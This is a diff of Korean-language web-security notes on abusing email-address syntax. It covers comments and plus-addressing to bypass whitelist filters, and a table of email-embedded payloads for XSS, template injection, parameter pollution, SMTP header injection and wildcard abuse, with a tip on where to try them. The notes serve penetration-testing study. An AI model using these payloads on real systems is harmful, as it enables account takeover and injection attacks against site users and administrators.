@@ -125,7 +125,7 @@ Email address format에는 <span style="background-color: #FFB6C1;">local-part@d
 ()(괄호)는 Local-part 에서 주석을 의미할 수 있다.<br>
 tartget+attacker@email.com === target@email.com 과 동일하다.<br><br>
 드물게 특수문자들은 제한적으로 사용이 가능하다."(),:;<>@[\]<br>
-도한 주석을 의미할 수 있다. 물론<br>
+도한 주석을 의미할 수 있다. 물론<br><br>
 tartget(attacker)@email.com === target@email.com 과 동일하다.<br>
 이를 통해 WhiteList 정책 필터링을 우회할 수 있다.
 
@@ -144,7 +144,7 @@ Local-Part 부분에서 “ 가 사용가능하다면 SMTP Injection 의 파급�
 | <span style="color:red">Vlunability</span> | <span style="color:red">Payload</span> |
 |-----------------------------|--------------------------------------------------|
 | XSS                         | test+(\<script\>alert(1)\</script\>)@example.com   |
-|                             | test@example(\<script\>alert(1)\</script\>.com     |
+|                             | test@example(\<script\>alert(1)\</scripts\>.com     |
 |                             | ”<script>alert(1)</script>”@example.com        |
 | Templiate Injection (SSTI)  | “<%=7*7%>”@example.com                         |
 |                             | test+(${{7*7}})@example.com                    |
@@ -155,7 +155,7 @@ Local-Part 부분에서 “ 가 사용가능하다면 SMTP Injection 의 파급�
 | Parameter Pollution         | victim&email=attacker@example.com              |
 | (Email) SMTP Header Injection | “%0d%0aContent-Length;%200%0d%0a%0d%0a”@example.com |
 |                             | ”recipient@test.com>\r\nRCPT TO;<victim+”@test.com |
-| Wildcard abuse              | %@example.com`                                 |
+| Wildcard abuse              | %@example.com                                 |
 
 
 💡 **<u style="color:red;">이러한 공격들은 특정 사용자들의 이메일 정보를 관리자에게 보낼 때 시도해볼 수 있다.</u>**
